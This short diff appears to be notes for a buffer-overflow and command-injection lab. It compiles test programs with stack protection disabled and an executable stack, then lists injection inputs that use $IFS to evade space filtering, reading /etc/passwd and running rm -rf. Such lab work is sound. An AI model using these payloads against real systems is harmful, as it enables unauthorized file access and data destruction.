@@ -1,0 +1,9 @@
+gcc -g -fno-stack-protector -z execstack -o command command.c
+gcc -g -fno-stack-protector -z execstack -o buffer buffer.c
+gcc -o login login.c
+
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaals$IFS-l
+rm$IFS'etc/leo'
+cat$IFS'etc/passwd'
+rm$IFS-rf$IFS'../test'
